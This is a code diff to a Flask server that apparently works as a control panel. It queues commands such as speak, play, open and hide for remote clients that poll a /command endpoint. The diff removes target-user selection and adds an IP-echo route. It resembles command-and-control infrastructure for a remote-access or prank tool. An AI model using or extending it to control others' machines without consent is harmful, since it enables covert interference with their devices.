@@ -10,7 +10,6 @@ firstReload = True
 timezone = ZoneInfo("Asia/Kolkata")
 startTime = time()
 spam = False
-selected_user = "93"
 STATIC_FOLDER = os.path.join("static")
 if not os.path.exists(STATIC_FOLDER):
     os.makedirs(STATIC_FOLDER)
@@ -28,10 +27,6 @@ def terminal():
     state = None
     color = "red"
     data1= None
-    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
-        target = json.load(file)
-    users = target["users"]
-    selected = target["selected"]
     with open(state_file, "r") as file:
         data1 = json.load(file)
     hs = data1["hideToggleState"]["state"]
@@ -51,15 +46,17 @@ def terminal():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,users=users,selected = selected)
-
+    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc)
+@app.route("/ip",methods=["GET"])
+def ip():
+	return request.remote_addr
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
     global spam
     if request.method == "POST":
         message = request.form["text"]   
         with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
-            if ("pLaY" not in message and "oPeN" not in message):    
+            if not spam and ("pLaY" not in message and "oPeN" not in message):    
                 file.write("sPeAk" + message)
             else:
                 file.write(message)
@@ -69,11 +66,8 @@ def edit():
 @app.route("/command", methods=["GET", "POST"])
 def command():
     global startTime
-    global selected_user
     global spam
     if request.method == "GET":
-        # user = request.get_json()
-        # user = user.get("user")
         startTime = time()
         cmd = ""
         message_file = os.path.join(STATIC_FOLDER, "message.txt")
@@ -101,12 +95,12 @@ def command():
                     with open(tasks_file, "w") as file:
                         json.dump(tasks, file, indent=4)
 
-        if not spam:
+        # Clear the message file if spam is off
+        if not spam and "hIdE" not in cmd:
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write("")
 
         return cmd if cmd else "none"
-    return "none"
 
 @app.route("/audio", methods=["POST", "GET"])
 def sounds():
@@ -252,21 +246,6 @@ def toggle():
         elif cmd == "sPaM":
             spam = True if state == "on" else False
     return redirect("/")
-
-@app.route("/change-user", methods=["POST"])
-def change_user():
-    global selected_user
-    data = request.get_json()
-    user = data.get("user")
-    selected_user = str(user)
-    print(selected_user)
-    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
-        target = json.load(file)
-    target["selected"] = selected_user
-    with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
-        json.dump(target, file, indent=4)
-    return "done"
-
 
 @app.route("/image", methods=["GET", "POST"])
 def img():
